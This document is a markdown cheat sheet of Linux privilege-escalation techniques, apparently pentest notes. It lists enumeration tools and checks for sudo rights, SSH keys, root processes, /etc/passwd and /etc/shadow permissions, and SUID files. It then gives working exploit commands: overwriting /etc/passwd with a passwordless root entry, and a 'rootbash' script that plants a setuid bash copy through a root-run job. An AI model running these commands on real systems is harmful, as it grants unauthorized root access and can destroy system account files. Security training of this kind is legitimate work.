## Enumeration

### Linpeas
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

```
linpeash.sh -a > output.txt
cat output.txt | less -R
```

### linux-smart-enumeration
https://github.com/diego-treitos/linux-smart-enumeration

```
./lse.sh -l (use this to increase verbosity level default 0)
```

### linux-exploit-suggester-2 
(use this to find kernel exploits)

https://github.com/jondonas/linux-exploit-suggester-2

### Manual checks

Lists all commands the user can use with sudo permissions

```
sudo -l
```

SSH directory

```
ls -l ~/.ssh
```

Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!

```
ps aux | grep root
ps -ef | grep root
```

Weak File Permissions
```
//if we can write this file we can add a new root user
ls -la /etc/shadow
ls -la /etc/passwd\

// exploit in this way
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
```


SUID/SGID Executables
An SUID is a file that allows a user to execute the file with the permissions of the file owner, an SGID is the same except with the group owner. If the owner is root, we can essentially run files with root permissions.

```
//find all SUID files

find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null find all SUID files

// find all SGID files
find / -perm -g=s -type f 2>/dev/null

```
Check for services running only locally 
```
netstat -antpx
```

Crontab. The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a .tar.gz file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.

```
We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.

https://github.com/DominicBreuker/pspy

```

PATH ABUSE: PATH is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type cat /tmp/test.txt instead of specifying the absolute path /bin/cat /tmp/test.txt. We can check the contents of the PATH variable by typing env | grep PATH or echo $PATH.

```
We can check the contents of the PATH variable by typing 
env | grep PATH or 
echo $PATH.

If you have write permissions on any folder inside the PATH variable you may be able to hijacking some libraries or binaries:
```





## EXPLOIT 
#### ROOTBASH
we can use this tecnquie when we found a script running as root, we can modify in this way
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
Ensure that overwrite.sh is executable:
```
chmod +x /home/user/overwrite.sh
```
run and gain a root shell (-p to preserve UID)
```
/tmp/rootbash –p
```
